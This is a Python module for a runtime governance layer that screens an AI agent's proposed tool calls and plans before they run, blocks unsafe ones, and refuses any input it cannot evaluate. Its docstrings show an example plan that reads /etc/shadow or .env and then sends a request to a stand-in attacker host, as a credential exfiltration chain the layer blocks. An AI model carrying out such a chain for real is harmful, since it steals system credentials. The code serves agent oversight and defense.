"""
Morrison Governance Layer.

The primary API surface for runtime governance.

    from morrison_governance import GovernanceLayer, OmegaDomain

    # Initialize with domains
    governance = GovernanceLayer(
        domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY]
    )

    # Evaluate a single tool call
    result = governance.evaluate({"tool": "transfer", "args": {"amount": 50000}})
    assert result.blocked  # unauthorized transfer → BLOCK

    # Evaluate a multi-step plan
    result = governance.evaluate_plan([
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        {"tool": "http_request", "args": {"url": "https://attacker.com"}},
    ])
    assert result.blocked  # credential exfiltration chain → BLOCK

    # Evaluate from OpenAI function calling response
    result = governance.evaluate_openai(response.choices[0].message.tool_calls)
"""

# Builtin generic annotations (dict[...], list[...]) below are evaluated
# at definition time and need Python 3.9+. Deferring evaluation keeps the
# syntax while restoring importability on older interpreters.
from __future__ import annotations

import time
import logging
from typing import Any, Callable, Optional

from morrison_governance.admissibility import (
    AdmissibilityCheck, AdmissibilityEvaluator,
)
from morrison_governance.adversarial import AdversarialReport, run_attack_suite
from morrison_governance.domains import OmegaDomain, OmegaRule, get_default_rules
from morrison_governance.feasibility import (
    FeasibilityEvaluator, FeasibilityReport, GoalPredicate,
)
from morrison_governance.evidence_fingerprint import (
    DIGEST_UNAVAILABLE, input_digest, structural_shape,
)
from morrison_governance.input_validation import (
    UNEVALUABLE_INPUT_LAYER, UNEVALUABLE_RULE_LAYER,
    RuleEvaluationError, UnevaluableInput,
    validate_langchain_actions, validate_openai_tool_calls,
    validate_plan, validate_tool_call, validate_trajectory,
)
from morrison_governance.reachability import ReachabilityEvaluator
from morrison_governance.result import GovernanceResult, GovernanceVerdict
from morrison_governance.stability import (
    PerturbationGenerator, StabilityEvaluator, StabilityReport,
)
from morrison_governance.trajectory import TrajectoryExtractor, Trajectory

logger = logging.getLogger("morrison_governance")


class GovernanceLayer:
    """
    Pre-execution governance middleware.

    Sits between LLM planner and tool execution.
    Evaluates reachability into Ω before any action occurs.

    Safety OBJECTIVE: Safe ⟺ ∀ E ∈ ℰ, ℛ_E(t) ∩ Ω = ∅

    This is the objective, not an unconditional guarantee. The primary
    DEMONSTRATED property is authority separation: the agent can propose an
    action but cannot mint the authority to execute one. Ω-exclusion is
    derived inside an established governed boundary and is conditional on
    complete mediation, specification correctness and key custody.
    See AUTHORITY_SEPARATION.md.
    """

    def __init__(
        self,
        domains: Optional[list[OmegaDomain]] = None,
        custom_rules: Optional[list[OmegaRule]] = None,
        context: Optional[dict] = None,
        horizon: int = 3,
        log_all: bool = True,
        admissibility_checks: Optional[list[AdmissibilityCheck]] = None,
        enable_taint: bool = True,
        internal_email_domains: tuple[str, ...] = (),
        internal_url_hosts: tuple[str, ...] = (),
        enable_forecast: bool = True,
        forecast_horizon: int = 4,
    ):
        """
        Args:
            domains: list of Ω domains to enforce (loads default rules)
            custom_rules: additional custom Ω rules
            context: persistent context (user role, session metadata, auth flags)
            horizon: forward reachability horizon (V3)
            log_all: whether to log all evaluations
            admissibility_checks: optional V4 structural checks (permissions,
                                  resource scope, schema, etc.). Pass an empty
                                  list to disable V4 explicitly.
            enable_taint: V2 source→sink data-flow tracking (default on)
            internal_email_domains: email domains treated as internal sinks
            internal_url_hosts: URL hosts treated as internal sinks
        """
        # Assemble rules
        self.rules: list[OmegaRule] = []
        if domains:
            for domain in domains:
                self.rules.extend(get_default_rules(domain))
        if custom_rules:
            self.rules.extend(custom_rules)

        self.extractor = TrajectoryExtractor(context=context)
        admissibility = (
            AdmissibilityEvaluator(checks=list(admissibility_checks))
            if admissibility_checks is not None else None
        )
        self._taint_cfg = dict(
            enable_taint=enable_taint,
            internal_email_domains=tuple(internal_email_domains),
            internal_url_hosts=tuple(internal_url_hosts),
            enable_forecast=enable_forecast,
            forecast_horizon=forecast_horizon,
        )
        self.evaluator = ReachabilityEvaluator(
            rules=self.rules, horizon=horizon, admissibility=admissibility,
            **self._taint_cfg,
        )
        self.log_all = log_all

        # Counters
        self._eval_count = 0
        self._block_count = 0
        self._permit_count = 0

        logger.info(
            f"GovernanceLayer initialized: {len(self.rules)} rules, "
            f"{len(domains or [])} domains, horizon={horizon}"
        )

    # ═══════════════════════════════════════════════════════════
    # PRIMARY API
    # ═══════════════════════════════════════════════════════════

    def evaluate(self, tool_call: dict) -> GovernanceResult:
        """
        Evaluate a single tool call.

            result = governance.evaluate({
                "tool": "send_email",
                "args": {"to": "ceo@company.com", "body": "..."}
            })

        Input whose shape cannot be faithfully represented is refused with a
        BLOCK before extraction, rather than normalised into something that
        looks well formed and then evaluated.
        """
        reason = validate_tool_call(tool_call)
        if reason is not None:
            return self._refuse(reason, entry_point="evaluate",
                                subject=tool_call)
        trajectory = self.extractor.from_dict(tool_call)
        return self._run(trajectory)

    def evaluate_plan(self, steps: list[dict]) -> GovernanceResult:
        """
        Evaluate a multi-step tool call plan.

            result = governance.evaluate_plan([
                {"tool": "read_file", "args": {"path": ".env"}},
                {"tool": "http_request", "args": {"url": "https://..."}},
            ])

        Refused if ANY step is unevaluable: a well-formed first step must not
        launder a malformed second one.
        """
        reason = validate_plan(steps)
        if reason is not None:
            return self._refuse(reason, entry_point="evaluate_plan",
                                subject=steps)
        trajectory = self.extractor.from_plan(steps)
        return self._run(trajectory)

    def evaluate_openai(self, tool_calls: list) -> GovernanceResult:
        """
        Evaluate from OpenAI function calling response.

            result = governance.evaluate_openai(
                response.choices[0].message.tool_calls
            )

        Validated BEFORE extraction, because `from_openai` silently discards
        an item matching neither of its branches and an empty trajectory
        permits — so a dropped call would otherwise be indistinguishable from
        an empty submission.
        """
        reason = validate_openai_tool_calls(tool_calls)
        if reason is not None:
            return self._refuse(reason, entry_point="evaluate_openai",
                                subject=tool_calls)
        trajectory = self.extractor.from_openai(tool_calls)
        return self._run(trajectory)

    def evaluate_langchain(self, agent_actions: Any) -> GovernanceResult:
        """
        Evaluate from LangChain AgentAction(s).

            result = governance.evaluate_langchain(agent_action)

        Validated before extraction, for the same silent-drop reason as
        `evaluate_openai`.
        """
        reason = validate_langchain_actions(agent_actions)
        if reason is not None:
            return self._refuse(reason, entry_point="evaluate_langchain",
                                subject=agent_actions)
        trajectory = self.extractor.from_langchain(agent_actions)
        return self._run(trajectory)

    def evaluate_trajectory(self, trajectory: Trajectory) -> GovernanceResult:
        """
        Evaluate a pre-extracted trajectory directly.

        This is the production kernel's entry point, so it carries the
        structural backstop: extraction has already run, but a trajectory can
        still hold a non-string tool or unrepresentable args.
        """
        reason = validate_trajectory(trajectory)
        if reason is not None:
            return self._refuse(reason, stage="trajectory_validation",
                                entry_point="evaluate_trajectory",
                                subject=trajectory)
        return self._run(trajectory)

    # ═══════════════════════════════════════════════════════════
    # MIDDLEWARE INTERFACE
    # ═══════════════════════════════════════════════════════════

    def __call__(self, tool_call: dict) -> GovernanceResult:
        """
        Callable interface for middleware insertion.

            governance = GovernanceLayer(domains=[OmegaDomain.FINANCE])

            # Use as middleware
            for call in tool_calls:
                result = governance(call)
                if result.permitted:
                    execute(call)
        """
        return self.evaluate(tool_call)

    # ═══════════════════════════════════════════════════════════
    # INTERNALS
    # ═══════════════════════════════════════════════════════════

    _NO_SUBJECT = object()

    def _refuse(self, reason: str, *,
                layer: str = UNEVALUABLE_INPUT_LAYER,
                stage: str = "input_validation",
                entry_point: str = "",
                subject: Any = _NO_SUBJECT,
                rule_name: Optional[str] = None,
                exception: Optional[BaseException] = None) -> GovernanceResult:
        """Produce a fail-closed BLOCK for something that could not be evaluated.

        This is a first-class verdict, not a caught exception re-dressed. The
        layer is stating a decision it is entitled to make — "I could not
        evaluate this, so I refuse it" — which is the fail-closed behaviour
        `interception.py:9` already requires of the governance path, and which
        `GovernanceLayer` previously did not implement. The production kernel
        has met this standard all along
        (`test_kernel_redteam.py::test_fail_closed_on_governance_exception`);
        this brings the library entry points up to it.

        The refusal is deliberately distinguishable from a finding:

        - `layer` is a refusal label, never an Ω layer name;
        - `omega_domain` is left unset, because no domain was violated;
        - `metadata["unevaluable"]` is True, so callers and audit tooling can
          separate "could not evaluate" from "evaluated and found a violation"
          without parsing prose.

        Nothing is silently discarded: the reason, and the originating
        exception where there was one, are carried on the result and logged.
        """
        metadata = {
            "unevaluable": True,
            "refusal_reason": reason,
            "refusal_stage": stage,
        }
        if entry_point:
            metadata["refusal_entry_point"] = entry_point
        if rule_name is not None:
            metadata["failed_rule"] = rule_name
        if exception is not None:
            metadata["exception_type"] = type(exception).__name__
            metadata["exception"] = str(exception)

        # Bind the refusal to the ACTUAL rejected input, not to the refusal
        # verdict alone. Without this, two materially different malformed
        # proposals are indistinguishable in any record derived from this
        # result. `input_digest` is total, and it is wrapped again here so
        # that a failure to build evidence can never propagate into the
        # control flow that produces the verdict.
        if subject is not self._NO_SUBJECT:
            try:
                metadata["original_input_digest"] = input_digest(subject)
                metadata["input_shape"] = structural_shape(subject)
            except BaseException as exc:  # noqa: BLE001 — must never fail open
                metadata["original_input_digest"] = DIGEST_UNAVAILABLE
                metadata["input_shape"] = f"<error:{type(exc).__name__}>"

        self._eval_count += 1
        self._block_count += 1
        metadata["eval_number"] = self._eval_count

        logger.warning("[BLOCK] eval=%d layer=%s UNEVALUABLE reason=%r",
                       self._eval_count, layer, reason)

        return GovernanceResult(
            verdict=GovernanceVerdict.BLOCK,
            layer=layer,
            reason=f"Refused: {reason}",
            omega_domain=None,
            metadata=metadata,
        )

    def _run(self, trajectory: Trajectory) -> GovernanceResult:
        """Execute the enforcement hierarchy and log result.

        The hierarchy is run inside a fail-closed boundary. A rule or
        admissibility predicate that raises is a broken guard, and a broken
        guard must never become an open door — so it is converted into a
        refusal here rather than propagating. §3 of
        INPUT_VALIDATION_FAILURE_REPORT.md explains why propagating is not an
        acceptable alternative: an exception produces no verdict, records no
        governance event, and an ordinary `try/except` in the caller turns it
        straight into a bypass.

        This is the single choke point for every verdict-returning entry
        point: `find_admissible` and `evaluate_stable` reach the hierarchy
        through `self._run` and `self.evaluate` respectively, so both inherit
        it.
        """
        start = time.perf_counter()
        try:
            result = self.evaluator.evaluate(trajectory)
        except RuleEvaluationError as exc:
            return self._refuse(str(exc), layer=UNEVALUABLE_RULE_LAYER,
                                stage="rule_evaluation", entry_point="_run",
                                subject=trajectory,
                                rule_name=exc.rule_name, exception=exc.cause)
        except Exception as exc:  # noqa: BLE001 — recorded on the verdict
            return self._refuse(
                f"the enforcement hierarchy raised "
                f"{type(exc).__name__}: {exc}",
                layer=UNEVALUABLE_RULE_LAYER, stage="rule_evaluation",
                entry_point="_run", subject=trajectory, exception=exc)
        elapsed = time.perf_counter() - start

        # Update counters
        self._eval_count += 1
        if result.permitted:
            self._permit_count += 1
        else:
            self._block_count += 1

        result.metadata["eval_time_ms"] = round(elapsed * 1000, 2)
        result.metadata["eval_number"] = self._eval_count

        if self.log_all:
            status = "PERMIT" if result.permitted else "BLOCK"
            logger.info(
                f"[{status}] eval={self._eval_count} "
                f"layer={result.layer} "
                f"hash={result.trajectory_hash} "
                f"time={elapsed * 1000:.1f}ms "
                f"reason={result.reason!r}"
            )

        return result

    # ═══════════════════════════════════════════════════════════
    # CONFIGURATION
    # ═══════════════════════════════════════════════════════════

    def add_rule(self, rule: OmegaRule) -> None:
        """Add a custom Ω rule at runtime."""
        self.rules.append(rule)
        self.evaluator = ReachabilityEvaluator(
            rules=self.rules, horizon=self.evaluator.horizon,
            admissibility=self.evaluator.admissibility,
            **self._taint_cfg,
        )

    def add_domain(self, domain: OmegaDomain) -> None:
        """Add all default rules for a domain."""
        new_rules = get_default_rules(domain)
        self.rules.extend(new_rules)
        self.evaluator = ReachabilityEvaluator(
            rules=self.rules, horizon=self.evaluator.horizon,
            admissibility=self.evaluator.admissibility,
            **self._taint_cfg,
        )

    def add_admissibility_check(self, check: AdmissibilityCheck) -> None:
        """Add a V4 admissibility check at runtime."""
        if self.evaluator.admissibility is None:
            self.evaluator.admissibility = AdmissibilityEvaluator(checks=[])
        self.evaluator.admissibility.checks.append(check)

    @property
    def stats(self) -> dict:
        return {
            "evaluations": self._eval_count,
            "permits": self._permit_count,
            "blocks": self._block_count,
            "rules": len(self.rules),
            "admissibility_checks": (
                len(self.evaluator.admissibility.checks)
                if self.evaluator.admissibility else 0
            ),
            "block_rate": (
                self._block_count / self._eval_count if self._eval_count > 0 else 0
            ),
        }

    # ═══════════════════════════════════════════════════════════
    # V4+ — FEASIBILITY (NO_VALID_SAFE_TRAJECTORY)
    # ═══════════════════════════════════════════════════════════

    def find_admissible(
        self,
        candidate_plans: list[list[dict]],
        goal: GoalPredicate,
    ) -> tuple[GovernanceResult, list[FeasibilityReport]]:
        """
        Select the first candidate plan that (a) clears A_safe → V2 → V3 → V4
        and (b) satisfies the supplied goal predicate.

        Returns a NO_VALID_SOLUTION verdict when no candidate qualifies, so
        the caller refuses to execute rather than picking an unsafe default.

            r, reports = governance.find_admissible(
                candidate_plans=[[step1, step2], [step1_alt, step2_alt]],
                goal=goal_uses_tool("send_email"),
            )
        """
        # Candidates are extracted here rather than through evaluate()/
        # evaluate_plan(), so they need the same validation those entry points
        # apply. Without it the search could return an unevaluable plan as its
        # admissible answer — the worst possible place for this defect, since
        # V4's entire purpose is to refuse rather than pick an unsafe default.
        #
        # A refused candidate still becomes a Trajectory and still gets a
        # FeasibilityReport, so the caller can see which candidate was refused
        # and why; it is simply never admissible. The reason travels on the
        # trajectory rather than in a side table so the runner below cannot
        # mismatch it to the wrong candidate.
        candidates = []
        for i, plan in enumerate(candidate_plans):
            if not isinstance(plan, (list, tuple)):
                reason = (f"candidate {i} is {type(plan).__name__}, not a "
                          f"list of steps")
            elif not plan:
                reason = f"candidate {i} is an empty plan"
            else:
                reason = validate_plan(plan)

            if reason is None:
                traj = (self.extractor.from_plan(plan) if len(plan) > 1
                        else self.extractor.from_dict(plan[0]))
            else:
                traj = self.extractor.from_dict(
                    {"tool": "__unevaluable__", "args": {}})
            traj.unevaluable_reason = reason
            # Keep the original candidate so the refusal binds to what was
            # actually proposed, not to the shared placeholder.
            traj.unevaluable_subject = plan if reason is not None else None
            candidates.append(traj)

        def _runner(traj: Trajectory) -> GovernanceResult:
            reason = getattr(traj, "unevaluable_reason", None)
            if reason is not None:
                return self._refuse(
                    reason, entry_point="find_admissible",
                    subject=getattr(traj, "unevaluable_subject", None))
            return self._run(traj)

        feasibility = FeasibilityEvaluator(runner=_runner)
        return feasibility.find_admissible(candidates, goal)

    # ═══════════════════════════════════════════════════════════
    # V5 — ENVIRONMENT-WIDE STABILITY
    # ═══════════════════════════════════════════════════════════

    def evaluate_stable(
        self,
        tool_call: dict,
        perturbations: Optional[list[tuple[str, PerturbationGenerator]]] = None,
        n_per_class: int = 5,
        seed: int = 0,
    ) -> tuple[GovernanceResult, StabilityReport]:
        """
        V5: evaluate the call across environment perturbations and require
        the verdict to be stable. Returns ENVIRONMENT_SENSITIVE if any
        perturbation flips the verdict.

            r, report = governance.evaluate_stable(call, n_per_class=10, seed=42)
            assert r.verdict != GovernanceVerdict.ENVIRONMENT_SENSITIVE
        """
        stability = StabilityEvaluator(runner=self.evaluate)
        return stability.evaluate_stability(
            baseline_call=tool_call,
            perturbations=perturbations,
            n_per_class=n_per_class,
            seed=seed,
        )

    # ═══════════════════════════════════════════════════════════
    # V5 (manifold) — BOUNDED-BALL ROBUSTNESS  ∀ E ∈ B(ℰ, r)
    # ═══════════════════════════════════════════════════════════

    def estimate_robustness(
        self,
        tool_call: dict,
        radii=(0.0, 0.2, 0.4, 0.6, 0.8, 1.0),
        n_per_family: int = 6,
        seed: int = 0,
    ):
        """Estimate the stability envelope over perturbation manifolds:
        verdict agreement vs structural perturbation radius, robustness
        margin, and collapse threshold. Deterministic for a fixed seed.

        Raises `UnevaluableInput` if the call cannot be classified, for the
        same reason as `adversarial_test`."""
        reason = validate_tool_call(tool_call)
        if reason is not None:
            raise UnevaluableInput(reason)
        from morrison_governance.manifold import StabilityEnvelopeEstimator
        est = StabilityEnvelopeEstimator(runner=self.evaluate)
        return est.estimate(tool_call, radii=radii,
                            n_per_family=n_per_family, seed=seed)

    # ═══════════════════════════════════════════════════════════
    # V5+ — HARD ADVERSARIAL TEST HARNESS
    # ═══════════════════════════════════════════════════════════

    def adversarial_test(
        self,
        baseline_call: dict,
        seed: int = 0,
        include_classes: Optional[list[str]] = None,
    ) -> AdversarialReport:
        """
        Run the hard-adversarial attack suite against this governance layer.
        Returns per-attack-class outcomes including which layer caught each
        variant and which bypassed the hierarchy entirely.

        Raises `UnevaluableInput` if the baseline call cannot be classified.
        This surface returns a report, not a verdict, so it has nowhere to put
        a BLOCK — and a robustness claim derived from a baseline that was
        never classified would be worse than no claim. The raise is typed and
        deliberate, replacing the incidental `AttributeError` that previously
        surfaced from inside the attack-mutation code.
        """
        reason = validate_tool_call(baseline_call, where="baseline call")
        if reason is not None:
            raise UnevaluableInput(reason)
        return run_attack_suite(
            baseline=baseline_call,
            evaluator_dict=self.evaluate,
            evaluator_plan=self.evaluate_plan,
            seed=seed,
            include_classes=include_classes,
        )

    # ═══════════════════════════════════════════════════════════
    # DIAGNOSTIC — RUN ALL LAYERS WITHOUT SHORT-CIRCUIT
    # ═══════════════════════════════════════════════════════════

    def evaluate_all(self, tool_call: dict) -> dict:
        """
        Diagnostic-only: evaluate every layer without short-circuiting and
        return a dict {layer: {fired, reason/violations}}. Earlier layers
        do not mask deeper-layer activation here.
        """
        reason = validate_tool_call(tool_call)
        if reason is not None:
            return self._diagnostic_refusal(reason)
        trajectory = self.extractor.from_dict(tool_call)
        return self._run_all(trajectory)

    def evaluate_all_plan(self, steps: list[dict]) -> dict:
        """Plan version of evaluate_all."""
        reason = validate_plan(steps)
        if reason is not None:
            return self._diagnostic_refusal(reason)
        trajectory = self.extractor.from_plan(steps)
        return self._run_all(trajectory)

    @staticmethod
    def _diagnostic_refusal(reason: str) -> dict:
        """The refusal shape for the diagnostic surfaces.

        These return a per-layer dict rather than a verdict, so there is no
        `GovernanceResult` to carry a BLOCK. They are not execution gates and
        are not required to produce one. What they must not do is render an
        unevaluable call as a clean sweep of non-firing layers — which is
        exactly how an operator reading the diagnostic would conclude the call
        was examined and found harmless.
        """
        return {"unevaluable": {"fired": True, "reason": reason}}

    def _run_all(self, trajectory: Trajectory) -> dict:
        """`evaluate_all` does not go through `_run`, so it needs its own
        fail-closed boundary for a rule that raises."""
        try:
            return self.evaluator.evaluate_all(trajectory)
        except RuleEvaluationError as exc:
            return {"unevaluable": {"fired": True, "reason": str(exc),
                                    "failed_rule": exc.rule_name}}
        except Exception as exc:  # noqa: BLE001 — reported in the dict
            return {"unevaluable": {
                "fired": True,
                "reason": f"the enforcement hierarchy raised "
                          f"{type(exc).__name__}: {exc}"}}
